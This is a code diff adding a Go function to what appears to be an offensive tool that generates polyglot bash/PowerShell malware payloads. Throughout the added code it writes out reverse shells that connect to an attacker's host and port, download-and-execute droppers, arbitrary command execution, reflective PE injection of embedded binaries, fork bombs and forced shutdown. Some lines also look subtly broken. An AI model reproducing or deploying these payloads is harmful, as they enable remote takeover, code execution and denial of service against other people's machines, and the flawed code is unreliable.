@@ -206,3 +206,102 @@ func random_string(n int) string {
 	}
 	return string(b)
 }
+
+// function for generating payload
+func generate_payload(payload_name string, sleep_interval string, 
+	out string, stdout bool){
+available_payloads := []string{"cmd_exec", "reverse_shell", "custom",                                                                                                                                                 
+														"download_exec", "memexec", "shutdown", "forkbomb"}
+if (! contains(available_payloads, payload_name)){
+print_error("No such payload: "+payload_name)
+os.Exit(0)
+}
+
+polyglot_template := get_template("templates/polyglot_template")
+polyglot_template = strings.Replace(polyglot_template, "SLEEP_INTERVAL", fmt.Sprintf("%d", interval_to_seconds(sleep_interval)), -1)
+
+powershell := ""
+bash := ""
+
+print_header("PAYLOAD CUSTOMIZATION")
+switch payload_name{
+case "reverse_shell":
+powershell = `$client = New-Object System.Net.Sockets.TCPClient("HOST", PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+`
+bash = `bash -i >& /dev/tcp/HOST/PORT 0>&1`
+
+host := input("[RHOST]", "Host to connect to", get_local_ip())
+port := input("[RPORT]", "Port to connect to", "4444")
+bash = strings.Replace(bash, "HOST", host, -1)
+bash = strings.Replace(bash, "PORT", port, -1)
+powershell = strings.Replace(powershell, "HOST", host, -1)
+powershell = strings.Replace(powershell, "PORT", port, -1)
+case "cmd_exec":
+powershell = `iex COMMAND`
+bash = `COMMAND`
+
+command := input("[COMMAND]", "Command to execute", "")
+bash = strings.Replace(bash, "COMMAND", command, -1)
+powershell = strings.Replace(powershell, "COMMAND", command, -1)
+case "memexec": 
+elf_file_name := input("[LINUX BINARY]", "Binary to embed end execute on Linux machine", "")
+elf_args := input("[ELF BINARY ARGS]", "Arguments to pass to the Linux binary", "")
+exe_file_name := input("[WINDOWS BINARY]", "Binary to embed end execute on Windows machine", "")
+exe_args := input("[WINDOWS BINARY ARGS]", "Arguments to pass to the Windows binary", "")
+encoded_elf_file := base64_encode(read_file(elf_file_name))
+encoded_exe_file := base64_encode(read_file(exe_file_name))
+tmp := random_string(4)
+bash = fmt.Sprintf(`
+echo "%s"|base64 -d| > /tmp/%s; chmod +x /tmp/%s; /tmp/./%s %s 		
+`, encoded_elf_file, tmp, tmp, tmp, elf_args)
+powershell = fmt.Sprintf(`
+$EncodedFile = "%s" 
+%s
+$DecodedFileByteArray = [System.Convert]::FromBase64String($EncodedFile)
+Invoke-ReflectivePEInjection -PEBytes $DecodedFileByteArray -ExeArgs %s
+`, encoded_exe_file, get_template("templates/pe_inject"), exe_args)
+
+case "custom":
+powershell_script := input("[POWERSHELL SCRIPT]", "Path to the powershell script", "")
+bash_script := input("[BASH SCRIPT]", "Path to the bash script", "")
+powershell = read_file(powershell_script)
+bash = read_file(bash_script)
+case "forkbomb":
+powershell = `Do {
+start powershell -windowstyle hidden { start-process powershell.exe -WindowStyle hidden
+}
+}
+Until ($x -eq $true)`
+bash = `:(){:|: &};:`
+print_info("This payload has no options")
+case "download_exec":
+url := input("[URL]", "URL address of the file to download", "")
+tmp := random_string(4)
+bash = fmt.Sprintf(`
+curl %s > %s; chmod +x %s; ./%s
+`, url, tmp, tmp)
+powershell = fmt.Sprintf(`
+$url = %s
+$out = %s
+Invoke-WebRequest -Uri $url -OutFile $out
+Start-Process -Filepath "$out"
+`, url, tmp+".exe")
+case "shutdown":
+powershell = `Stop-Computer -ComputerName localhost`
+bash = `shutdown`
+print_info("This payload has no options")
+
+}
+
+polyglot_template = strings.Replace(polyglot_template, "X_POWERSHELL_SCRIPT_X", powershell, -1)
+polyglot_template = strings.Replace(polyglot_template, "X_BASH_SCRIPT_X", bash, -1)
+
+if ! stdout{
+write_to_file(out, polyglot_template)
+fmt.Println("")
+print_good("Saved generated payload in file: "+ bold(out))
+} else {
+fmt.Println(polyglot_template)
+}
+
+}
